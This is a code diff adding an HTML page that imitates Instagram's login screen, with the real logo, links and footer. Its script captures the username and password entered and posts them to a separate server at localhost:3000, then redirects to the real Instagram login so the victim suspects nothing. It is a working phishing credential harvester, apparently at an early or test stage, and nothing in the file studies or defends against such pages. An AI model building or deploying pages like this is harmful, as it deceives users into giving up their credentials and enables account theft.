@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="Designes/Instagram_icon.png" type="image/png">
+    <title>Instagram • Login</title>
+    <style>
+        body {
+            background-color: rgb(0, 0, 0);
+            color: rgb(255, 255, 255);
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+        }
+
+        main .img {
+            height: 100px;
+            width: auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        main .img img {
+            height: 75px;
+        }
+
+        #loginForm {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 300px;
+            margin-top: 3%;
+            margin-left: 7%;
+        }
+
+        #loginForm input {
+            width: 75%;
+            padding: 10px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background-color: #222;
+            color: white;
+            font-size: 12px;
+            outline: none;
+        }
+
+        #loginForm input::placeholder {
+            color: #888;
+        }
+
+        #loginForm button {
+            width: 82%;
+            padding: 10px;
+            background-color: #1900ff;
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #loginForm button:hover {
+            background-color: #8a00c1;
+        }
+
+        main {
+            margin-top: 3%;
+        }
+
+        main .facebook {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 25px;
+        }
+
+        main .facebook img {
+            height: 20px;
+            margin-right: 10px;
+        }
+
+        main .facebook a {
+            color: #1900ff;
+            text-decoration: none;
+            font-weight: bold;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        main .forgotpassword {
+            display: flex;
+            text-align: center;
+            justify-content: center;
+            margin-top: 8%;
+        }
+
+        main .forgotpassword a {
+            color: white;
+            text-decoration: none;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 15px;
+        }
+
+        main .xr {
+            margin-top: 15%;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        main .xr a {
+            text-decoration: none;
+            font-weight: bold;
+            color: #1900ff;
+        }
+
+        main .xs {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: -35px;
+        }
+
+        main .xs .apple img {
+            height: 120px;
+            margin-right: 4px;
+        }
+
+        main .xs .google img {
+            height: 36px;
+            margin-left: 4px;
+        }
+
+        .xsm {
+            height: 90px;
+            width: 350px;
+        }
+
+        .xsm a {
+            font-family: Arial, Helvetica, sans-serif;
+            text-decoration: none;
+            color: #444;
+            font-size: 15px;
+            margin: 5px;
+        }
+
+    </style>
+</head>
+<body>
+    <main>
+        <div class="img">
+            <img src="Designes/Instagram_logo.png" alt="Instagram Logo">
+        </div>
+        <div>
+            <form id="loginForm">
+                <label for="username"></label>
+                <input type="text" id="username" name="username" required placeholder="Phone nummber, username, or email">
+                <br>
+                <label for="password"></label>
+                <input type="password" id="password" name="password" placeholder="Password">
+                <br>
+                <button type="submit">Log in</button>
+                <p id="feedback" style="color: rgb(255, 0, 0);"></p>
+            </form>
+        </div>
+        <hr>
+        <div class="facebook">
+            <img src="Designes/facebook_logo.png" alt="Facebook Logo">
+            <a href="https://www.facebook.com">Log in with Facebook</a>
+        </div>
+        <div class="forgotpassword">
+            <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+        </div>
+        <div class="xr">
+            <p>Don't have an account?</p>
+            <a href="https://www.instagram.com/accounts/signup/email/?hl=en">Sing up</a>
+        </div>
+        <div class="xr">
+            <p>Get the app.</p>
+        </div>
+        <div class="xs">
+            <div class="apple">
+                <a href="https://apple.com">
+                    <img src="Designes/download-on-the-app-store-apple-logo.svg" alt="AppStore">
+                </a>
+            </div>
+            <div class="google">
+                <a href="https://google.com/">
+                    <img src="Designes/Google_Play_Store_badge_EN.svg.webp" alt="GooglePlay">
+                </a>
+            </div>            
+        </div>
+        <div class="xsm">
+            <a href="https://www.instagram.com/">Meta</a>
+            <a href="https://www.instagram.com/">Info</a>
+            <a href="https://www.instagram.com/">Blog</a>
+            <a href="https://www.instagram.com/">Jobs</a>
+            <a href="https://www.instagram.com/">Hilfe</a>
+            <a href="https://www.instagram.com/">API</a>
+            <a href="https://www.instagram.com/">Datenrichtlinien</a>
+            <a href="https://www.instagram.com/">Cookie-Einstellungen</a>
+            <a href="https://www.instagram.com/">Nutzungsbedingungen</a>
+            <a href="https://www.instagram.com/">Standorte</a>
+            <a href="https://www.instagram.com/">Instagram Lite</a>
+            <a href="https://www.instagram.com/">Threads</a>
+            <a href="https://www.instagram.com/">Hochladen von Kontakten und Nicht-Nutzer</a>
+            <a href="https://www.instagram.com/">Meta Verified</a>
+        </div>
+    </main>
+    <script>
+        
+        const apiAdresse = 'http://localhost:3000';
+
+        const form = document.getElementById('loginForm');
+        const feedback = document.getElementById('feedback');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            feedback.textContent = 'Processing...';
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                    const response = await fetch(`${apiAdresse}/login`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username, password }),
+                });
+
+                if (response.ok) {
+                    window.location.replace = 'https://www.instagram.com/accounts/login/';
+                } else {
+                    const error = await response.json();
+                    feedback.textContent = error.error || 'Login failed';
+                }
+            } catch (err) {
+                feedback.textContent = 'An error occurred. Please try again.';
+                console.error(err);
+            }
+        });
+    </script>
+</body>
+</html>
